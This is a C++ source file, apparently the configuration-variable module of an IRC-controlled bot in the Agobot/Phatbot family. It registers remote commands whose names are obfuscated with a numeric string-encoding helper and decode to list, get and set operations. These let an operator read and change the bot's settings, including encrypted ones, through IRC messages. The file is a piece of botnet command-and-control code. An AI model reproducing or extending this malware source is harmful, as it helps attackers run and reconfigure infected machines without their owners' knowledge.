#include "main.h"
#include "cvar.h"
#include "mainctrl.h"
	
CCVar::CCVar() { m_lCvars.clear(); }
CCVar::~CCVar() { m_lCvars.clear(); }
void CCVar::Init()
{	m_lCvars.clear();
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdList,			dp(3,22,1,18,78,12,9,19,20,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdGet,			dp(3,22,1,18,79,7,5,20,0).CStr(),			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSet,			dp(3,22,1,18,78,19,5,20,0).CStr(),			this);
//	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLoadConfig,	dp(0).CStr(),								this);
//	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSaveConfig,	dp(0).CStr(),								this);

}
void CCVar::RegisterCvar(cvar *pCvar, const CString &sName, const CString &sValue, const CString &sDescription, bool bSave, bool bEncrypted, int iKey)
{	pCvar->sName.Assign(sName); pCvar->sDescription.Assign(sDescription); pCvar->bSave=bSave;
	SetCVar(pCvar, sValue);
	pCvar->sValue.m_bIsCryptStr=bEncrypted; pCvar->sValue.m_iCryptKey=iKey; pCvar->sValue.Assign(sValue);
	m_lCvars.push_back(pCvar); }
void CCVar::RegisterCvar(cvar *pCvar, const char *szName, const char *szValue, const char *szDescription, bool bSave, bool bEncrypted, int iKey)
{	RegisterCvar(pCvar, CString(szName), CString(szValue), CString(szDescription), bSave, bEncrypted, iKey); }

cvar *CCVar::FindCvarByName(const CString &sName, bool bExact)
{	list<cvar*>::iterator ic; int iCount=0;
	for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ++ic)
		if(!(*ic)->sName.CompareNoCase(sName)) return (*ic);
    return NULL; }
cvar *CCVar::FindCvarByName(const char *szName, bool bExact)
{	return FindCvarByName(CString(szName), bExact); }
/*
bool CCVar::ParseConfig(const CString &sFilename)
{	return true; }
bool CCVar::ParseConfig(const char *szFilename)
{	return ParseConfig(CString(szFilename)); }

bool CCVar::SaveConfig(const CString &sFilename)
{	return true; }
bool CCVar::SaveConfig(const char *szFilename)
{	return SaveConfig(CString(szFilename)); }
*/
void CCVar::SetCVar(cvar *pCvar, const char *szValue)
{	pCvar->sValue.Assign(szValue);
	pCvar->fValue=(float)atof(pCvar->sValue.CStr()); pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(!pCvar->sValue.Compare("true")) pCvar->bValue=true; }

void CCVar::SetCVar(cvar *pCvar, const CString &sValue)
{	pCvar->sValue.Assign(sValue.m_szString);
	pCvar->fValue=(float)atof(pCvar->sValue.CStr()); pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(!pCvar->sValue.Compare("true")) pCvar->bValue=true;
	pCvar->sValue.m_bIsCryptStr=sValue.m_bIsCryptStr;
	pCvar->sValue.m_iCryptKey=sValue.m_iCryptKey;
}

void CCVar::SetCVar(cvar *pCvar, float fValue)
{	pCvar->sValue.Format("%f", fValue);
	pCvar->fValue=fValue; pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(fValue>=1) pCvar->bValue=true; }

void CCVar::SetCVar(cvar *pCvar, bool bValue)
{	if(bValue) { pCvar->sValue.Assign("true"); pCvar->fValue=1.0f; pCvar->iValue=1; } 
	else { pCvar->sValue.Assign("false"); pCvar->fValue=0.0f; pCvar->iValue=0; }
	pCvar->bValue=bValue; }

void CCVar::SetCVar(cvar *pCvar, int iValue)
{	pCvar->sValue.Format("%d", iValue);
	pCvar->fValue=(float)iValue; pCvar->iValue=iValue;
	pCvar->bValue=false; if(iValue>=1) pCvar->bValue=true; }


bool CCVar::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare(m_cmdList.sName.Str()))
	{	g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "(cvar)", pMsg->sReplyTo.Str());
		list<cvar*>::iterator ic; int iCount=0;
		for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ++ic)
		{	iCount++; g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "[%d] \"%s\" = \"%s\" (\"%s\")", iCount, (*ic)->sName.CStr(), (*ic)->sValue.CStr(), (*ic)->sDescription.CStr());
			Sleep(1500); }

		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdGet.sName.CStr()))
	{	cvar *pTemp=FindCvarByName(pMsg->sChatString.Token(1, " "), true);
		if(pTemp) return g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s = \"%s\"", pTemp->sName.CStr(), pTemp->sValue.CStr());
		else return false; }

	else if(!pMsg->sCmd.Compare(m_cmdSet.sName.Str()))
	{	cvar *pTemp=FindCvarByName(pMsg->sChatString.Token(1, " "), true);
		if(pTemp) { CString sOldStr(pTemp->sValue); SetCVar(pTemp, pMsg->sChatString.Token(2, " ", true));
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s = \"%s\" [was \"%s\"]", pTemp->sName.CStr(), pTemp->sValue.CStr(), sOldStr.CStr());
			return true; }
		else return false; }
/*
	else if(!pMsg->sCmd.Compare(m_cmdLoadConfig.sName.Str()))
	{	if(ParseConfig(""))
			return g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Loaded Config");
		else
		{	g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Couldn't Load Config");
			return false; } }

	else if(!pMsg->sCmd.Compare(m_cmdSaveConfig.sName.Str()))
	{	if(SaveConfig(CString("")))
			return g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Saved Config.");
		else
		{	g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Couldn't Save Config");
			return false; } }
*/
	return false; }
